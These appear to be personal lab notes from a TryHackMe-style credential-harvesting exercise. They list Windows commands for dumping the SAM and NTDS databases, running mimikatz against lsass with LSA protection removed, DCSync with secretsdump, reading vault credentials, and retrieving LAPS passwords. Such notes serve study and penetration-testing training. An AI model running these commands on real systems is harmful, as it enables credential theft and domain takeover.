# Credential 

credentail can be found in many non secure location like 
Clear text file 
database file
Memory
PAssword Manage/ Vault
AD


# clear text file 

we can use some credential in command so we can check the command history of the user to check if there is some pass 
some credentail are stored in the reg we can use 
reg query HKLM /f password /t REG_SZ /s to seach password in the reg 

# database

like the mcaffe DB in the host that can allow us to retrieve info

# Memory Dump 

in the memory (RAM) Windows use a lot of 


# SAM 

the sam is a local DB of windows that contains all LOCAL user info this can be found in :

c:\Windows\System32\config\sam

and we need the system config file 

c:\Windows\System32\config\system

but this can be read or be copied . 
to have access to it we have some possibilities :

## HashDump : 
use in-memory code injection to get the SAM SB 

## SHADOW COPY 
we canc reate a shadow copy to have access to the SAM DB:
this will create a copy of the OS and with the second command we have acceess to the path where the copy is . 

wmic shadowcopy call create Volume='C:\'
vssadmin list shadows 

# registry 

we can use the reg to access to the file with : 
reg save HKLM\sam {PATH_TO_SAVE}\sam-reg

reg save HKLM\sam {PATH_TO_SAVE_FILE}\sam-reg

## decrypt 

to decript the DB we can use a secretsdump.py python3.9 secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL

# Memory Dump

## MimiKatz
mimikatz allow to get some credential in memory.
first we need to check if we have enought privilege with : 

privilege::debug

and so we can use 

sekurlsa::logonpasswords

if the command return an Handle on memory (0x00000005) Error we need to disable the LSA protection

start download the mimidrv driver a driver to disable the LSA Security :

write in mimikatz : !+


and then :

!processprotect /process:lsass.exe /remove

# Cred manager 

the cred manage is a software to store password :
to list all web password we can use : 

VaultCmd /listproperties:"Web Credentials"

the password is not shown but a powershell script can extrasct them 

sekurlsa::credman can crack the cred manager of windows .


# NTDS : 

## LOCAL
we can dump ntds login with local file: 
we need the following files :

C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY

or in a powerhell

powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"


and we can crack the hash avec:
```powershell
secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

## REMOTE :

to crack remote NTDS we can use a DC Sync attack. 
the goal is to duplicate DC Sync 

there is 2 tools to do it :
```powershell
secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.142.43 
```
or minikatz: 


# LAPS 

Group Policy Preferences allow to change the Admin account password . 
Xml contains a password encrypted but the key has been leaked.

a new method was been created Local Administrator Password Solution. this solution have 2 object  ms-mcs-AdmPwd (clear-text password of the local administrator) and ms-mcs-AdmPwdExpirationTime(expiration time to reset the password)

to check if LAPS is activated we can use :

dir "C:\Program Files\LAPS\CSE" -> if this dir contains AdmPwd.dll.

we can get functions with: 
```powershell
Get-Command *AdmPwd*
Find-AdmPwdExtendedRights -Identity *
```
we will find the correct group or person have access to this password . and with the good user we can use 
```powershell
Get-AdmPwdPassword -ComputerName creds-harvestin
```

# Kerberoasting

allow obtain AD tickets lki TGT and TGS 

it's a python tools 
